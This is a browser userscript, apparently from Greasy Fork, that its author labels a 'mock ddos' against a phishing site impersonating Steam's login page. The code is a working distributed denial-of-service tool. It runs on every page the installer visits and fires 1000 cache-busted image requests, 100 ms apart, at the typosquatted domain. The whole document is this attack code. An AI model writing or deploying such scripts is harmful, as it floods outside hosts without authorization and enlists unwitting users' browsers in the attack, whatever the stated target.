// ==UserScript==
// @name    mock ddos to attack the fake website
// @author  burningall
// @description ddos钓鱼网站
// @version     2016.1.25
// @include     *
// @run-at      document-start
// @compatible  chrome  完美运行
// @compatible  firefox  完美运行
// @license     The MIT License (MIT); http://opensource.org/licenses/MIT
// @supportURL      http://www.burningall.com
// @contributionURL troy450409405@gmail.com|alipay.com
// @namespace https://greasyfork.org/zh-CN/users/3400-axetroy
// @downloadURL https://update.greasyfork.org/scripts/16522/mock%20ddos%20to%20attack%20the%20fake%20website.user.js
// @updateURL https://update.greasyfork.org/scripts/16522/mock%20ddos%20to%20attack%20the%20fake%20website.meta.js
// ==/UserScript==

(function () {
  // ddos地址
  var url = '//steamcommuunity.com/login/home',
  // 每隔多少ms发送一次请求
    delay = 100,
  // 请求次数
    times = 1000,
  // 以下不要修改
    count = 0,
    pic, rand;

  function ddos(url) {
    pic = new Image();
    rand = Math.floor(Math.random() * 1000);
    pic.src = url + '?random=' + rand;
  }

  var ddosTimer = setInterval(function () {
    if (count >= times) {
      clearInterval(ddosTimer);
    } else {
      ddos(url);
      count++;
    }
  }, delay);
})();